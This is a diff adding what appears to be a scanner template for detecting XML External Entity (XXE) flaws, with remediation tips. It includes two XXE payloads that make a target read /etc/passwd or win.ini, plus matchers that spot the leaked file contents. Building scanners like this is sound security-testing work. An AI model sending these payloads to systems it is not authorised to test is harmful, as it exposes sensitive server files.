@@ -1,0 +1,43 @@
+id: {{.Name}}
+
+info:
+  name:  XML External Entity (XXE
+  author: Wahyuhadi
+  severity: medium
+  reference:
+    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  tags: dast,xxe
+  description: |
+    XML External Entity (XXE) is a security vulnerability that allows an attacker to exploit an application that processes XML input by injecting malicious external entity references. This can lead to sensitive data exposure, server-side request forgery (SSRF), denial of service (DoS), or even remote code execution in certain cases.
+  metadata:
+    max-request: 3
+    tech: all
+    fixing:
+      - 1.Restrict DOCTYPE declarations and disallow SYSTEM and PUBLIC entities
+      - 2.Validate XML input against an XML Schema (XSD) or DTD whitelist.
+      - 3.Use Web Application Firewalls (WAF).
+
+requests:
+  - raw:
+      - |
+        {{ .Raw }}
+
+    payloads:
+      path:
+        - '<!DOCTYPE+abcabc+[+<!ENTITY+abcabc+SYSTEM+"file:///c:/windows/win.ini">+]><x>&abcabc;</x>'
+        - '<!DOCTYPE+abcabc+[+<!ENTITY+abcabc+SYSTEM+"file:////etc/passwd">+]><x>&abcabc;</x>'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
